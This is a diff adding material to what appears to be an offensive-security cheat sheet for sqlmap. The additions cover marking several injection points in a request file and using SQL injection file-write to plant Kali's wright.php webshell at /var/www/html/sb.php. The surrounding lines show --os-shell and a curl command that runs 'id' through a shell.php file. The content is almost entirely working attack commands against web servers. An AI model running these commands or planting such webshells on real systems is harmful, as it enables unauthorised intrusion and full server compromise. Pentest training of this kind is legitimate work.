@@ -137,11 +137,14 @@ sqlmap -u "http://target.com/page.php?id=1" --os-shell
 
 ### Mark Injection Point
 
-Use `*` to mark specific parameter:
+Use `*` to mark specific parameter(s) to test. You can mark more than one (e.g. cookie and POST body); sqlmap will test each.
 
 ```bash
 sqlmap -u "http://target.com/api" --data="id=1*&name=test"
 sqlmap -u "http://target.com/page?id=1*"
+# From request file: add * in the value you want to test (e.g. username=jack&country=Sweden* and cookie user=HASH*)
+sqlmap -r index.req --batch
+# With time-based blind, parameter #2 (e.g. country) may be the only injectable one; --os-shell/--sql-shell may fail but --file-write can still work
 ```
 
 ### From Burp Request File
@@ -231,6 +234,16 @@ sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
 # Verify
 curl "http://target.com/shell.php?cmd=id"
 ```
+
+**More stable PHP webshell (Kali):** Use **wright.php** instead of a one-liner when you have file-write (e.g. SQLi + DBA). It often behaves better than a simple `?cmd=` shell (cleaner output, fewer "Cannot execute blank command" issues):
+
+```bash
+# Location on Kali: /usr/share/webshells/php/wright.php
+sqlmap -r request.req --file-write="/usr/share/webshells/php/wright.php" --file-dest="/var/www/html/sb.php" --batch
+# Then visit http://TARGET/sb.php (or whatever path you used)
+```
+
+Works with time-based blind SQLi; file-write can still succeed when `--os-shell` / `--sql-shell` do not.
 
 ---
 
